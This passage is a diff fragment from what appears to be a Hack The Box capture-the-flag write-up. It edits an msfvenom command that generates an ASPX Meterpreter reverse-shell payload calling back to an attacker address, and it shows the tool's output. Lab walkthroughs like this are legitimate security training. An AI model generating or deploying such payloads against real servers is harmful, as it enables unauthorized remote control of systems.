@@ -120,7 +120,7 @@ It turns out we do have write access. Based on this, I try accessing the web ser
 Generate a payload:
 ```bash
 ─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~]
-└──╼ [★]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=9999 -f aspx > shell.aspx
+└──╼ [★]$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.14.32 LPORT=9999 -f aspx > shell.aspx
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
